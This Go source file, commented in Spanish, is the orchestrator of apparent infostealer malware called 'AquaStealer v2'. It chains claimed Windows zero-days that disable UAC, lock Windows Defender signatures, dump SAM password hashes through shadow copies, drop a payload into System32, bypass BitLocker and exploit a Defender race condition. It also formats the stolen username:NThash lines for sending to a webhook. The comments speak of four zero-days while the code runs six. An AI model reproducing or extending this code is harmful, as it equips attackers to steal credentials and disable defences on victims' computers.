package zerodays

// zerodays.go — AquaStealer v2
// Coordinador de los 4 zero-days (nightmare-eclipse Go port)
//
// Orden de ejecución OBLIGATORIO:
//   1. GreenPlasma  — EoP vía registry symlink, deshabilita UAC  [sincrónico]
//   2. UnDefend     — file-lock sobre WD signatures              [goroutine, mantiene locks]
//   3. BlueHammer   — VSS dump SAM + NT hashes                   [goroutine, retorna creds]
//   4. RedSun       — write arbitrary a System32 (opcional)      [goroutine, solo si payload]
//
// Uso:
//   result := zerodays.RunAllZerodays(payloadExePath)
//   // payloadExePath = "" para saltar RedSun
//   for _, entry := range result.Credentials {
//       fmt.Printf("[*] %s : %s\n", entry.Username, entry.NTHash)
//   }

import (
	"fmt"
	"sync"
	"time"
)

// ZerodayResult contiene el resultado consolidado de todos los zero-days
type ZerodayResult struct {
	// GreenPlasma
	UACDisabled    bool
	GreenPlasmaOK  bool

	// UnDefend
	WDLocked       bool

	// BlueHammer
	Credentials    []SAMEntry
	WDFrozen       bool
	BlueHammerOK   bool

	// RedSun
	RedSunOK       bool
	PayloadDropped bool

	// YellowKey
	YellowKeyResult *YellowKeyResult

	// RoguePlanet
	RoguePlanetResult *RoguePlanetResult
}

// RunAllZerodays ejecuta los 4 zero-days en el orden correcto.
// payloadPath: ruta del .exe a escribir en System32 vía RedSun.
//              Pasar "" para deshabilitar RedSun.
//
// Bloquea hasta que GreenPlasma+UnDefend terminen;
// BlueHammer y RedSun pueden terminar después (resultado disponible via canal).
func RunAllZerodays(payloadPath string) *ZerodayResult {
	result := &ZerodayResult{}

	// ── FASE 1: GreenPlasma (EoP / UAC disable) — SINCRÓNICO ─────────────
	// Debe correr primero: el resto de las técnicas se benefician de que UAC
	// esté deshabilitado para obtener handles elevados sin prompt.
	func() {
		defer func() {
			if r := recover(); r != nil {
				// GreenPlasma puede panic en sistemas sin cldapi.dll
			}
		}()
		result.GreenPlasmaOK = RunGreenPlasma()
		result.UACDisabled = result.GreenPlasmaOK
	}()

	// ── FASE 2: UnDefend — goroutine que mantiene locks forever ───────────
	// No bloquea main: los locks deben persistir mientras el proceso viva.
	// No esperamos resultado porque RunUnDefend() no retorna (loop infinito
	// de monitoreo). Esperamos 800ms para que establezca el lock inicial.
	udReady := make(chan struct{}, 1)
	go func() {
		defer func() { recover() }()
		// Señalizar que empezó
		select {
		case udReady <- struct{}{}:
		default:
		}
		RunUnDefend() // no retorna
	}()

	select {
	case <-udReady:
		result.WDLocked = true
	case <-time.After(1200 * time.Millisecond):
		result.WDLocked = false
	}

	// ── FASE 3: BlueHammer (VSS SAM dump) — goroutine con resultado ────────
	// Requiere que UnDefend haya empezado (WD puede estar bloqueado).
	// Esperamos su resultado para poder enviarlo al webhook.
	var bhWg sync.WaitGroup
	bhWg.Add(1)
	go func() {
		defer bhWg.Done()
		defer func() { recover() }()
		creds, frozen := RunBlueHammer()
		result.Credentials = creds
		result.WDFrozen = frozen
		result.BlueHammerOK = len(creds) > 0
	}()

	// ── FASE 4: RedSun (System32 write) — goroutine opcional ──────────────
	// Solo si payloadPath está especificado.
	if payloadPath != "" {
		go func() {
			defer func() { recover() }()
			ok := RunRedSun(payloadPath)
			result.RedSunOK = ok
			if ok {
				RunRedSunDrop(payloadPath)
				result.PayloadDropped = true
			}
		}()
	}

	// ── FASE 5: YellowKey (BitLocker bypass via FsTx) — goroutine ─────────
	// Instala los archivos FsTx en un volumen accesible (EFI/USB/fixed).
	// El bypass se activa en el próximo reinicio a WinRE.
	// Solo afecta Windows 11 / Server 2022 / 2025.
	var ykWg sync.WaitGroup
	ykWg.Add(1)
	go func() {
		defer ykWg.Done()
		defer func() { recover() }()
		ykRes := RunYellowKey()
		result.YellowKeyResult = &ykRes
	}()

	// Esperar BlueHammer (timeout generoso: VSS creation puede tardar)
	bhDone := make(chan struct{})
	go func() {
		bhWg.Wait()
		close(bhDone)
	}()

	select {
	case <-bhDone:
	case <-time.After(45 * time.Second):
		// BlueHammer tardó demasiado — continuamos sin creds
	}

	// ── Esperar YellowKey (timeout independiente) ──────────────────────────
	ykDone := make(chan struct{})
	go func() {
		ykWg.Wait()
		close(ykDone)
	}()
	select {
	case <-ykDone:
	case <-time.After(10 * time.Second):
		// YellowKey tardó demasiado — continuamos sin resultado
	}

	// ── FASE 6: RoguePlanet (LPE via WD race condition) — goroutine ────────
	// Requiere que UnDefend haya corrido (WD activo para disparar MpClean).
	// No bloquea el flujo principal — esperamos hasta 60s para resultado.
	var rpWg sync.WaitGroup
	rpWg.Add(1)
	go func() {
		defer rpWg.Done()
		defer func() { recover() }()
		rpRes := RunRoguePlanet()
		result.RoguePlanetResult = &rpRes
	}()

	rpDone := make(chan struct{})
	go func() {
		rpWg.Wait()
		close(rpDone)
	}()
	select {
	case <-rpDone:
	case <-time.After(60 * time.Second):
		// RoguePlanet tardó demasiado — race condition no converge en esta ejecución
	}

	return result
}

// Summary retorna un string compacto con los resultados para el webhook.
func (r *ZerodayResult) Summary() string {
	if r == nil {
		return "zerodays: not run"
	}
	s := fmt.Sprintf(
		"[ZeroDays] UAC=%v | WDLocked=%v | WDFrozen=%v | Creds=%d | RedSun=%v",
		r.UACDisabled, r.WDLocked, r.WDFrozen, len(r.Credentials), r.RedSunOK,
	)
	if r.YellowKeyResult != nil {
		s += "\n" + r.YellowKeyResult.YellowKeySummary()
	}
	if r.RoguePlanetResult != nil {
		s += "\n" + r.RoguePlanetResult.RoguePlanetSummary()
	}
	return s
}

// CredentialLines retorna las credenciales en formato username:NThash para el webhook.
func (r *ZerodayResult) CredentialLines() []string {
	if r == nil || len(r.Credentials) == 0 {
		return nil
	}
	lines := make([]string, 0, len(r.Credentials))
	for _, e := range r.Credentials {
		lines = append(lines, fmt.Sprintf("%s:%s", e.Username, e.NTHash))
	}
	return lines
}
